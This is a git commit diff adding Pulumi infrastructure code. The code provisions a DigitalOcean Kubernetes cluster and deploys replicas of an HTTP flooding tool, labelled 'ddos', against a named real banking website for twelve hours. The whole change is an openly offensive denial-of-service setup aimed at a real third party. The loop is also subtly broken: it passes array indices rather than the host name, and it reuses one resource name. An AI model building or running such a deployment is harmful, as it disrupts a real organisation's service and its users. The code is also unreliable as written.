7a6631db8b160dce24dd6db9f5c60ab38f3345d6
londra <me@londra.dev>
2022-02-26 20:56:08 +0200

    add cluster creation and app deployment

---
+++ index.ts
@@ -0,0 +1,32 @@
+import * as k8s from "@pulumi/kubernetes";
+import * as digitalocean from "@pulumi/digitalocean";
+
+const cluster = new digitalocean.KubernetesCluster("do-k8s", {
+    region: digitalocean.Region.FRA1,
+    version: "latest",
+    nodePool: {
+        name: "default",
+        size: digitalocean.DropletSlug.DropletS1VCPU2GB,
+        nodeCount: 3,
+    },
+  });
+
+export const kubeconfig = cluster.kubeConfigs[0].rawConfig;
+
+
+const provider = new k8s.Provider("do-k8s", { kubeconfig })
+
+const tartgetsList = ["tinkoff.ru"]
+for (const target in tartgetsList){
+const appLabels = { app: "ddos" };
+const deployment = new k8s.apps.v1.Deployment("ddos", {
+    spec: {
+        selector: { matchLabels: appLabels },
+        replicas: 5,
+        template: {
+            metadata: { labels: appLabels },
+            spec: { containers: [{ name: "ddos", image: "alpine/bombardier", args: ["-c", "1000", "-d", "43200s", "-l", target]}] }
+        }
+    }
+}, { dependsOn: [cluster] });
+}
